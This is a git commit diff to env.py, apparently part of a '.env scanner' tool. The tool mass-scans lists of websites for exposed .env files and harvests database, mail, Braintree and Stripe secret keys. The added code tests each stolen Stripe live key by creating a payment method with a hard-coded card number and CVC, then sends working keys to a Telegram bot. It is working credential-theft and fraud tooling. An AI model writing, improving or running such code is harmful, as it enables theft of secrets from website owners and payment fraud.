affd6bf89fb252f6c24fb9a55bee7ac805bed8d6
faouzikr <147516160+faouzikr@users.noreply.github.com>
2024-06-25 04:41:40 +0100

    Update env.py

--- env.py
+++ env.py
@@ -22,69 +22,81 @@ class xcol:
     GREY = '\033[38;2;158;158;158m'
 
 class ENV:
+    def __init__(self):
+        self.mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live', 'APP_ENV=', 'BRAINTREE_PUBLIC_KEY']
+
     def scan(self, url):
-        rr = ''
-        proto = ''
-        mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live', 'APP_ENV=', 'BRAINTREE_PUBLIC_KEY']
-        try:
-            r = requests.get(f'http://{url}/.env', verify=False, timeout=10, allow_redirects=False)
-            if r.status_code == 200:
-                resp = r.text
-                if any(key in resp for key in mch):
-                    rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : http://{url}'
-                    with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
-                        output.write(f'{resp}\n')
-                    if "sk_live" in resp:
-                        with open('SK_ENV.TXT', 'a') as file_object:
-                            file_object.write(f'ENV : {url}\n')
-                        lin = resp.splitlines()
-                        for x in lin:
-                            if "sk_live" in x:
-                                with open('SK_LIVE.TXT', 'a') as file_object:
-                                    file_object.write(re.sub(".*sk_live", "sk_live", x) + '\n')
-                                tokyo_sender = re.sub(".*sk_live", "sk_live", x) + '\n'
-                                requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={tokyo_sender}&parse_mode=HTML")
-                    if "BRAINTREE_PUBLIC_KEY" in resp:
-                        with open('Braintree.txt', 'a') as file_object:
-                            file_object.write(f'Braintree : {url}\n')
-                else:
-                    rr = 'RE'
-            else:
-                rr = 'RE'
-        except:
-            rr = 'RE'
+        rr = self.check_url(url, 'http')
         if 'RE' in rr:
-            try:
-                proto = 'https'
-                r = requests.get(f'https://{url}/.env', verify=False, timeout=10, allow_redirects=False)
-                if r.status_code == 200:
-                    resp = r.text
-                    if any(key in resp for key in mch):
-                        rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : https://{url}'
-                        with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
-                            output.write(f'{resp}\n')
-                        if "sk_live" in resp:
-                            with open('SK_ENV.TXT', 'a') as file_object:
-                                file_object.write(f'ENV : {url}\n')
-                            lin = resp.splitlines()
-                            for x in lin:
-                                if "sk_live" in x:
-                                    with open('SK_LIVE.TXT', 'a') as file_object:
-                                        file_object.write(re.sub(".*sk_live", "sk_live", x) + '\n')
-                                    tokyo_sender = re.sub(".*sk_live", "sk_live", x) + '\n'
-                                    requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={tokyo_sender}&parse_mode=HTML")
-                        if "BRAINTREE_PUBLIC_KEY" in resp:
-                            with open('Braintree.txt', 'a') as file_object:
-                                file_object.write(f'Braintree : {url}\n')
-                    else:
-                        rr = f'{xcol.LRED}[-] :{xcol.RESET} https://{url}'
-                else:
-                    rr = f'{xcol.LRED}[-] :{xcol.RESET} https://{url}'
-            except:
-                rr = f'{xcol.LRED}[*] :{xcol.RESET} https://{url}'
+            rr = self.check_url(url, 'https')
         print(rr + '/.env')
 
-if __name__ == '__main__':
+    def check_url(self, url, proto):
+        rr = 'RE'
+        try:
+            r = requests.get(f'{proto}://{url}/.env', verify=False, timeout=10, allow_redirects=False)
+            if r.status_code == 200:
+                resp = r.text
+                if any(key in resp for key in self.mch):
+                    rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : {proto}://{url}'
+                    self.save_output(url, proto, resp)
+                else:
+                    rr = f'{xcol.LRED}[-] :{xcol.RESET} {proto}://{url}'
+        except requests.RequestException:
+            rr = f'{xcol.LRED}[*] :{xcol.RESET} {proto}://{url}'
+        return rr
+
+    def save_output(self, url, proto, resp):
+        os.makedirs('ENVS', exist_ok=True)
+        with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
+            output.write(f'{resp}\n')
+        if "sk_live" in resp:
+            with open('SK_ENV.TXT', 'a') as file_object:
+                file_object.write(f'ENV : {url}\n')
+            for line in resp.splitlines():
+                if "sk_live" in line:
+                    self.log_live_key(line)
+        if "BRAINTREE_PUBLIC_KEY" in resp:
+            with open('Braintree.txt', 'a') as file_object:
+                file_object.write(f'Braintree : {url}\n')
+
+    def log_live_key(self, line):
+        sk_live_key = re.sub(".*sk_live", "sk_live", line)
+        with open('SK_LIVE.TXT', 'a') as file_object:
+            file_object.write(sk_live_key + '\n')
+        self.make_stripe_request(sk_live_key)
+
+    def make_stripe_request(self, sk_live_key):
+        url = "https://api.stripe.com/v1/payment_methods"
+        data = {
+            "type": "card",
+            "card[number]": "5178058714350744",
+            "card[exp_month]": "01",
+            "card[exp_year]": "2027",
+            "card[cvc]": "263"
+        }
+        headers = {
+            "Authorization": f"Bearer {sk_live_key}"
+        }
+        response = requests.post(url, data=data, headers=headers)
+        if response.status_code == 200:
+            response_json = response.json()
+            if "id" in response_json:
+                message = f"Live sk : {sk_live_key}"
+                requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}&parse_mode=HTML")
+                print(f"{xcol.LGREEN}[Stripe]{xcol.RESET} Request successful with id")
+            else:
+                print(f"{xcol.LGREEN}[Stripe]{xcol.RESET} Request successful without id")
+        elif response.status_code == 401 and "api_key_expired" in response.text:
+            print(f"{xcol.LRED}[Stripe]{xcol.RESET} API key expired")
+        elif "Sending credit card numbers directly to the Stripe API is generally unsafe" in response.text:
+            message = f"sk integration off : {sk_live_key}"
+            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}&parse_mode=HTML")
+            print(f"{xcol.LRED}[Stripe]{xcol.RESET} Integration off: {sk_live_key}")
+        else:
+            print(f"{xcol.LRED}[Stripe]{xcol.RESET} Request failed: {response.status_code} - {response.text}")
+
+def main():
     os.system('clear')
     print(""" \033[38;2;158;158;158m
 ███████╗██╗  ██╗    ███████╗███╗   ██╗██╗   ██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
@@ -94,27 +106,28 @@ if __name__ == '__main__':
 ███████║██║  ██╗    ███████╗██║ ╚████║ ╚████╔╝     ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
 ╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═══╝  ╚═══╝      ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                                                                                                                
- 
   \u001B[0m""")
 
-    if not os.path.isdir("ENVS"):
-        os.makedirs("ENVS")
-    threads = []
     while True:
         try:
             thrd = int(input(xcol.GREY + "[THREAD] : " + xcol.RESET))
             break
-        except:
-            pass
+        except ValueError:
+            print("Invalid input. Please enter an integer.")
+
     while True:
         try:
             inpFile = input(xcol.GREY + "[URLS PATH] : " + xcol.RESET)
             with open(inpFile) as urlList:
                 argFile = urlList.read().splitlines()
             break
-        except:
-            pass
+        except FileNotFoundError:
+            print("File not found. Please enter a valid file path.")
+
     with ThreadPoolExecutor(max_workers=thrd) as executor:
+        env_scanner = ENV()
         for data in argFile:
-            threads.append(executor.submit(ENV().scan, data))
-    quit()
+            executor.submit(env_scanner.scan, data)
+
+if __name__ == '__main__':
+    main()
